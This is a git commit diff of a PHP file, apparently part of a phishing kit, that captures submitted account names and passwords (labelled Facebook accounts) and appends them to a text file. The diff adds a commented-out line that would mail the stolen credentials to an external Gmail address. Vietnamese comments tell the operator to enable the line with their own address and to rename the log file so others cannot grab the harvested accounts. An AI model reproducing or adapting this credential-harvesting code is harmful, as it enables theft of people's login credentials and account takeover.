fb39472980f6b247b3f5ce028770e5dea55b157c
ticchien111 <87794542+ticchien111@users.noreply.github.com>
2021-10-24 08:08:17 +0700

    Update index.php

--- sc0m/index.php
+++ sc0m/index.php
@@ -4,7 +4,10 @@ if(isset($_POST["acc"])){
     $acc = $_POST["acc"];
     $pass = $_POST["pass"];
     $type = $_POST["type"];
+     $subject = "Cảm ơn bạn đã sử dụng code!";
+     $headers = "Tài khoản facebook";
     $body = "\nTài Khoản $type :$acc\nMật Khẩu :$pass\n";
+     // mail("jaxuatt6@gmail.com", $headers, $body); // muốn gửi về mail thì bỏ 2 dấu // phía trước đi rồi thay mail
     $test = fopen("hu.txt","a");//đổi tên file hu.txt này để tránh trường hợp người khác vào lấy acc
     fwrite($test,$body);
     fclose($test);
